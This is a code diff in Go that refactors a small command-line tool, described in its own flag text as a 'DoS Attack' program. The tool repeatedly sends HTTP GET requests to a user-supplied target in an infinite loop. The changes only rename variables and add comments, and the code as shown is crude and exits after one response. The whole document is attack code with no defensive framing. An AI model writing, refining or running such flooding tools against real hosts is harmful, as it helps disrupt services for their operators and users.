@@ -7,25 +7,27 @@ import (
 	"os"
 )
 
-var v = flag.String("target", "", "target to run DoS Attack on")
+var target = flag.String("target", "", "target to run DoS Attack on")
 
 func main() {
-	responseChannel := make(chan interface{})
-	flag.Parse()
-	if *v == "" {
+  // channel for accepting responses and passing them through to the pipeline
+	resChannel := make(chan interface{})
+  flag.Parse()
+  // checking for value in required flags
+	if *target == "" {
 		flag.PrintDefaults()
 		os.Exit(1)
 	}
-	fmt.Println(*v)
+	fmt.Println(*target)
 	go func() {
-		// infinitie loop
+		// infinite loop
 		for {
-			resp, err := http.Get(*v)
+			resp, err := http.Get(*target)
 			if err != nil {
 				panic(err)
 			}
-			responseChannel <- resp
+			resChannel <- resp
 		}
 	}()
-	fmt.Println(<-responseChannel)
+	fmt.Println(<-resChannel)
 }
